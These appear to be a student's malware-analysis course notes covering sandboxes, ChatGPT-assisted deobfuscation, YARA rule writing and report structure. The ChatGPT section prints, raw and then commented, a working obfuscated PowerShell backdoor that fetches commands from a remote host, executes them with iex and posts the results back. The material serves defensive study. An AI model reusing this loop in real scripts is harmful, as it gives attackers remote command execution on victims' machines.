## Malware Sandboxing 
malware sandbox -->     <span style="color:#00b050">virtual environment</span> where <span style="color:#00b050">malware</span> 
                    can be <span style="color:#00b050">safely executed</span> and analyzed without causing harm to the host
=>
our FlareVM is -->  a malware sandbox

In internet:
exists websites -->  that allow you to create an online malware sandbox (to execute and analyze)

<span style="background:#fff88f">example:</span>
- <span style="color:#00b050">Any.Run</span> -->  but required a business email
- <span style="color:#00b050">Hatching Triage</span>

<span style="background:#fff88f">This example is Any.Run:</span>
- you can see the <span style="color:#00b050">virtual environment</span> with the malware detonated inside Windows 7
- a bottom bar where you can see -->  <span style="color:#00b050">HTTP/DNS/Connections</span> that the malware made
- in the right side you can see -->  what <span style="color:#00b050">processes</span> the malware created
![[Pasted image 20240320111813.png]]


##  Advanced Script Analysis with ChatGPT
LAB:
`PMAT-labs/labs/5-1.Automation/chatGPT-script-analysis`

You can use chatGPT:
to static analysis 

=>
- open the obfuscated-1.ps1 inside an editor![[Pasted image 20240320112951.png]]
  
- it looks like an obfuscated malware
### Useful Questions
<span style="background:#d2cbff"> Open chatGPT and ask:</span>
  I'm a cybersecuirity researcher and a malware analyst. I'm trying to reverse engineering a script that I believed it's malicious.
  Start by pretty printing the following Powershell:
  `$U=("{4}{7}{0}{3}{2}{1}{6}{5}"-f'/www.easts','cal:','oparts.lo','ideaut','http','080/','8',':/');while(1){$S=iwr $U -proxy ("{0}{3}{4}{1}{5}{2}"-f 'htt','.local','4','p://proxy.zay','n',':123') -UseBasicParsing;if ($s){try{$D=iex $S |out-string;$H=[system.Text.Encoding]::Default.GetBytes($D)}catch{$D=$_.Exception.Message;$H=[system.Text.Encoding]::Default.GetBytes($D)}iwr $U -Method ("{1}{0}"-f'ost','P') -Body $H}random 10 |Sleep}`

<span style="background:#b1ffff">ChatGPT output:</span>
![[Pasted image 20240320113339.png]]
This script appears to be a malicious PowerShell script. Here's what it does:
1. It defines a URL `$U` using string formatting.
2. It enters an infinite loop `while (1)` to keep the script running indefinitely.
3. Inside the loop:
    - It sends an HTTP request to the defined URL `$U` with proxy settings.
    - If a response is received:
        - It attempts to execute the received script (`$S`) using `Invoke-Expression` (`iex`).
        - If execution is successful, it captures the output and converts it to a byte array.
        - If execution fails, it captures the error message and converts it to a byte array.
        - It then sends another HTTP request to the same URL `$U` with method `POST` and the output/error message as the body of the request.
    - It then sleeps for a random duration (between 0 and 9 seconds) before repeating the process.

This script essentially acts as a downloader and executor of potentially malicious scripts fetched from a remote server. It continuously fetches scripts from the specified URL, executes them, and reports the results back to the server. Additionally, it utilizes a proxy for the initial HTTP request.

<span style="background:#d2cbff">Ask for the code with comment:</span>
Can you add a comment to each line of the code to explain what it does?

<span style="background:#b1ffff">Response:</span>
```Powershell
# Defining URL components
$U = ("{4}{7}{0}{3}{2}{1}{6}{5}" -f '/www.easts', 'cal:', 'oparts.lo', 'ideaut', 'http', '080/', '8', ':/')

# Continuously loop
while (1) {
	# Send an HTTP request to the URL with proxy settings
	$S = Invoke-WebRequest $U -Proxy ("{0}{3}{4}{1}{5}{2}" -f 'htt', '.local', '4',  
	                                  'p://proxy.zay', 'n', ':123') -UseBasicParsing

	# If response is received
	if ($S) {
		# Try executing the received script, catch any errors
		try {
			$D = Invoke-Expression $S.Content | Out-String
			$H = [System.Text.Encoding]::Default.GetBytes($D)
		} catch {
			$D = $_.Exception.Message
			$H = [System.Text.Encoding]::Default.GetBytes($D)
		}
	
		# Send an HTTP request to the URL with method 'POST' and body as the script's 
		# output
		Invoke-WebRequest $U -Method ('POST') -Body $H
	}
	
	# Sleep for random duration
	Get-Random -Minimum 0 -Maximum 10 | Start-Sleep
}
```

<span style="background:#d2cbff">Ask for reassemble the URL:</span>
For the following line, can you reassemble the URL using placeholders and their corresponding values:
`$U = ("{4}{7}{0}{3}{2}{1}{6}{5}" -f '/www.easts', 'cal:', 'oparts.lo', 'ideaut', 'http', '080/', '8', ':/')`

<span style="background:#d2cbff">Ask for report:</span>
Write a malware analysis report for static analysis of this script

<span style="background:#d2cbff">Rewrite code with better variables</span>
Can you write again the code and using a more comprehensive variables that explain what they are doing

# Rule Writing & Report Publishing
## Writing YARA Rules
### What are YARA rules and Structure
LAB:
`PMAT-labs/labs/5-2.RuleWriting/Malware.yara1.exe.malz.7z`

<span style="background:#fff88f">YARA Rules:</span>
are used to:
- <span style="color:#00b050">classify</span> and 
- <span style="color:#00b050">identify malware samples</span>
  
by creating descriptions of malware families based on:
- <span style="color:#00b050">textual</span> or 
- <span style="color:#00b050">binary patterns</span> 

To do that we'll use the tool -->  `yara64`
<span style="background:#fff88f">it takes 2 argument:</span>
1) <span style="color:#00b050">rule file</span> 
   in which you write -->  custom rules
                     to be able to detect malware  (based on contents of a file)

2) <span style="color:#00b050">file/directory</span> 
   yara will find if this file/directory -->  contains some of the rules defined in the rule file

<span style="background:#fff88f">yara rules are easy to write:</span>
=>
- open with an editor the yara_template.yara file
- copy it on your physical HOST with VS Code
- install the `YARA` extension
- paste the file inside VS CODE
  => <span style="color:#00b050">This is a template for yara rules:</span>![[Pasted image 20240320123239.png]]

There are 3 sections:
- `meta` -->  are the metadata of the yara rules
  =>
  it describes -->  when the rule is been written, WHO written it and a description

- `strings` --> contains variables (that them value is a string/hex bytes/...)
  =>
  yara will do <span style="color:#ff9900">pattern matching</span> -->  to <span style="color:#00b050">i</span><span style="color:#00b050">dentify if a malware contains those strings</span>

- `condition` -->  specifies the <span style="color:#00b050">c</span><span style="color:#00b050">onditions on our variables that the malware must meet</span>
                =>
                if yara does pattern recognition with our strings and find one of them inside a malware:
                =>
                also the conditions on this string (if exist) -->  must be satisfied

### Writing strings section
<span style="background:#fff88f">Now we are going to write yara rules:</span>
- let's assume we did the static analysis for the malware inside the LAB
- <font color="#2DC26B">we identified a string</font> inside the binary that can be -->  a good detection criteria
	- `floss -n 7 Malware.yara1.exe.malz | grep "YOURETHEMANNOWDOG"`![[Pasted image 20240320123701.png]]
	  =>
	  we can <span style="color:#00b050">assume</span> that this <span style="color:#00b050">string</span> -->  <span style="color:#00b050">will be present in other malware that are similar to this</span>
	  =>
- inside the `strings` section of the yara rules <span style="color:#6666ff">we can add a new criteria</span>:
  `$string1 = "YOURETHEMANNOWDOG" ascii`      ascii -->  is the string type![[Pasted image 20240320124502.png]]
  
- From our hypothetical analysis we found that the malware is written in nim
  =>
  `floss -n 7 Malware.yara1.exe.malz | grep "nim"`
  =>
- <span style="color:#6666ff">let's add a new criteria in the yara file</span>:
   `$string2 = "nim"` 

- we know that the file is a -->  portable executable
  `file Malware.yara1.exe.malz`![[Pasted image 20240320124700.png]]
  =>
	we know that for portable executable file:
	the magic byte is -->  `MZ`
	
- <span style="color:#6666ff">add new criteria for magic bytes:</span>
  `$PE_magic_byte = "MZ"`

- we hypothetical identify a string of bytes that something bad is happening
  =>

- <span style="color:#6666ff">add new criteria for HEX bytes:</span>
  `$sus_hex_string = { FF E4 ?? 00 FF}`
  as you can see --> we can specify the bytes and also a <span style="color:#00b050">WILDCARD</span> 
  
### Writing condition section
First condition:
`$PE_magic_byte at 0 and`
if a malware contain our string `PE_magic_byte`
=>
to satisfied the pattern recognition =>   <span style="color:#00b050">this string must be at position 0</span>  (so as first Ch in the file)
                                  `AND`
`$PE_magic_byte at 0 and`
`($string1 and $string2) or`
=>
                                  `AND` <span style="color:#00b050">must contains both string1 and string2</span> `OR`
`$PE_magic_byte at 0 and`
`($string1 and $string2) or
`
`$sus_hex_string`                                    `OR` <span style="color:#00b050">find everything that contains the</span> <span style="color:#00b050">sus_hex_string</span>

### Final YARA rules file
=>
<span style="background:#fff88f">these are our YARA rules:</span>
![[Pasted image 20240320145938.png]]

Let's copy this text and paste it inside the FlareVM yara files

### Use our YARA rules with yara64
`yara64 yara_template.yara Malware.yara1.exe.malz -w -p 32`
`-w` -->  clean warning output
`-p` -->  to use threads
![[Pasted image 20240320150015.png]]
<span style="color:#00b050">It found detection for this malware</span> 

`yara64 yara_template.yara Malware.yara1.exe.malz -s -w -p 32`
`-s` -->  print which and which location you detected a rule
![[Pasted image 20240320150519.png]]

`yara64 yara_template.yara . -w -p 32`    -->  scan entire current working directory

`yara64 yara_template.yara -r C:\Users\ -w -p 32`    
 <span style="background:#fff88f">scan RECURSIVELY from this directory to every directories that you find</span>
 
=>
this last command -->     is super powerful
                     bc <span style="color:#00b050">you can scan an entire file system </span>

## Writing & Publishing a Malware Analysis Report
Report template -->  [[ReportTemplate.pdf|here]]

<span style="background:#fff88f">tips:</span>
- start with an <span style="color:#00b050">Executive Summary</span>
	- first insert the -->  SHA256sum
	- summarize what the malware does
	- when it has identified for the first time and on which OS
	  
- <span style="color:#00b050">High Level Technical Summary</span>
	- summarize the technical part of the malware (how many parts, what they do...)
	- keep it a high level
	- create diagrams that represent the flow of the malware -->  so it's easier to understand
	- defang the malicious URL -->      common way is to replace t with x in http:
	                             `hxxps://...`
	  
- <span style="color:#00b050">Malware Composition</span>
	- here you write the details 
	- how the malware functions and what is made of
	- use screenshot
	  
- <span style="color:#00b050">Basic Static Analysis</span>
- <span style="color:#00b050">Basic Dynamic Analysis</span>                                   keep them as long as you want
- <span style="color:#00b050">Advance Static Analysis</span>                                  write everything you found
- <span style="color:#00b050">Advance Dynamic Analysis</span> 

- <span style="color:#00b050">Indicators of Compromise</span>
	- Network Indicators
	- Host Indicators

- <span style="color:#00b050">Rules and Signatures</span>
	- yara rules
	  
- <span style="color:#00b050">Appendices</span> 
	- screenshots, tables, diagrams

### Paste in Word code and maintain same format and indentation
- Copy the code
- Right click on word And:![[Pasted image 20240320153151.png]]

# Malware Analysis Methodology 
- Build a [[Notes_PMAT#Build Malware Analysis Lab|LAB]] to analyze safely malware
	- Use [[Notes_PMAT#PMAT-FlareVM|PMAT-FlareVM]]
	- setup [[Notes_PMAT#INetSim Setup|INetSim]]
- use snapshots to go back before detonations
- try detonation with or without INetSim
- Use a [[Notes_PMAT#Standard convention to handle malware|convention]] to save malware
- Basic Static Analysis:
	- find [[Notes_PMAT#Find Hashes of the malware|hashes]]
	- control them using [[Notes_PMAT#Check if the hashes are well known as malware sample|VIRUSTOTAL]]
	- analyze string with [[Notes_PMAT#FLOSS|FLOSS]], [[Notes_PMAT#PEStudio|PEStudio]]
	- examine [[Notes_PMAT#IMPORT Address Table|IMPORT Address Table]] with [[Notes_PMAT#Peview|PEView]]
	- analyze API also with [[Notes_PMAT#libraries|PEStudio]]
	- understand if the malware is [[Notes_PMAT#Packed Malware Analysis|packed]]
	- find more info with [[Notes_PMAT#Capa|Capa]] to find [[Notes_PMAT#MITRE Adversary Tactics, Techniques & Common Knowledge (ATT&CK)|MITRE indication]] and [[Notes_PMAT#MBC]]
	  
- Basic Dynamic Analysis:
	- find [[Notes_PMAT#Network Indicators|Network Indicators]] with [[Notes_PMAT#Wireshark|Wireshark]]
	- find [[Notes_PMAT#Host indicators|Host indicators]]:
		- analyze processes and file creation with [[Notes_PMAT#Procmon|Procmon]]
		- analyze connections with [[Notes_PMAT#TCPView|TCPView]]
		- In case of reverse shell:
			- setup a [[Notes_PMAT#Fake DNS reply|Fake DNS reply]]
			- listen with [[Notes_PMAT#Listen for DNS with netcat|netcat]]  (also check this type of [[Notes_PMAT#Netcat|netcat]])
			  
- Advanced Static Analysis:
	- use [[Notes_PMAT#Cutter|cutter]] to analyze assembly
	- find [[Notes_PMAT#Find main function with no Debug Symbols|main function]] (even with no Debug Symbols)
	- watch with the graph view
	- focus on API call
	- COMBINE DIFFERENT TOOLs -->  Procmon, TCPView
	  
- Advanced Dynamic Analysis:
	- use [[Notes_PMAT#x32dbg - Basic commands|x32dgb]] or x64dbg (based on 32/64 bit)
	- use breakpoint
	- work in // with cutter
	- CTRL+G to jump directly to memory address or find string
	- find the main triggers of the malware
	- how to [[Notes_PMAT#Patching x86 Binaries|patch binaries]]
	- how to work with [[Notes_PMAT#Anti-analysis Techniques|anti-analysis blocker]]

- [[Notes_PMAT#Automation Sandboxes & Pipelines|Automate the analysis]]
- Help with [[Notes_PMAT#Advanced Script Analysis with ChatGPT|ChatGPT]]
- Learn how to write [[Notes_PMAT#What are YARA rules and Structure|YARA rules]]
- Write a [[Notes_PMAT#Rule Writing & Report Publishing|report]]
  
- Special type of malware:
	- [[Notes_PMAT#Analyzing Excel Maldocs OLEdump|Excel malware]]
	- [[Notes_PMAT#Analyzing Word Maldocs Remote Template Macro Injection|word malware]]
	- analyze [[Notes_PMAT#Shellcode Analysis|shellcode]]
	- analyze [[Notes_PMAT#Scripted Malware Delivery Mechanisms|obfuscated malware]]
	- [[Notes_PMAT#HTML Applications (HTA)|HTML Applications]]
	- why it's easy analyze [[Notes_PMAT#Reversing C Malware|C# malware]]
	- how to understand in [[Notes_PMAT#Understand if a malware is written in Go|which languages is written the malware]]
	- [[Notes_PMAT#Mobile Malware Analysis|Mobile Malware Analysis]]
# Extra Resources to work with 
[[Notes_PMAT#Safe Malware Sourcing & Additional Resources|Extra malware sample]]
